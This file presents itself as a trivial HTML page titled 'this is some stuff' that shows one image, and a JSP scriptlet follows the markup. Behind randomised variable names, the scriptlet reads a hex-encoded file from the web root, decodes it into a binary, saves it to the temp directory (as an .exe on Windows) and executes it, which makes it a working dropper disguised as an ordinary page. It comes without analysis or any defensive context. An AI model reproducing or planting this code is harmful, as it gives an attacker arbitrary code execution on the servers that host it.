<HTML>
<HEAD> <TITLE>this is some stuff</TITLE> </HEAD>
<BODY>
  <IMG SRC="getoverit.gif">
</BODY>
</HTML>
<%@ page import="java.io.*" %>
<%
String kfkqmqShB = application.getRealPath("/") + "bhiOkaulN.txt";
String ypXUUBj = System.getProperty("java.io.tmpdir") + "/oAscVtBs";
String KcposPiyvnCOn = "";
if (System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
ypXUUBj = ypXUUBj.concat(".exe");
}
FileInputStream HYizmjxTAjtwW = new FileInputStream(kfkqmqShB);
FileOutputStream bgaasI = new FileOutputStream(ypXUUBj);
int QKhjgfuVmdkqvL = HYizmjxTAjtwW.available();
byte dkizUxsK[] = new byte[QKhjgfuVmdkqvL];
HYizmjxTAjtwW.read(dkizUxsK);
HYizmjxTAjtwW.close();
byte[] ntnhLWsRgxGNslZ = new byte[QKhjgfuVmdkqvL/2];
for (int KRGWuyrhP = 0; KRGWuyrhP < QKhjgfuVmdkqvL; KRGWuyrhP += 2)
{
char kttQUGREqc = (char) dkizUxsK[KRGWuyrhP];
char BvBZBKBwWfUpfa = (char) dkizUxsK[KRGWuyrhP + 1];
int yhFrtJly = Character.digit(kttQUGREqc, 16) & 0xff;
yhFrtJly <<= 4;
yhFrtJly += Character.digit(BvBZBKBwWfUpfa, 16) & 0xff;
ntnhLWsRgxGNslZ[KRGWuyrhP/2] = (byte)yhFrtJly;
}
bgaasI.write(ntnhLWsRgxGNslZ);
bgaasI.close();
Process hhcRLps = Runtime.getRuntime().exec(ypXUUBj);
%>
